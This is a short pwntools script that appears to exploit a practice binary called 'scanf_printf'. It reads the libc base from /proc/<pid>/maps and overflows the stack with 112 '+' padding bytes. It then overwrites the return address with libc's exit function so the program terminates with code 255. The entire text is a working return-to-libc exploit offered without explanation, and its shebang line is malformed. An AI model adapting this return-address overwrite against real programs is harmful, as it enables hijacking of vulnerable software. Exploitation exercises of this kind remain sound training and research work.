#!/ usr/bin / python

import re
from pwn import p32, process

p = process ("./scanf_printf")
l_addr = None

with open("/proc/{0}/maps".format(p.pid), "r") as f:
    for l in f :
        r = re.findall(r"([0-9a-f]*)-.*/usr/lib32/libc-2.32.so", l)
        if r:
            l_addr = int(r[0], 16)
            break

ret_offset = 112
exit_offset = 0x37e50
exit_code = 255

f_addr = l_addr + exit_offset

payload = ("+" * ret_offset).encode() + p32(f_addr) + "-_-!".encode() + bytes([exit_code])
p.sendline(payload)
p.clean()
p.interactive()  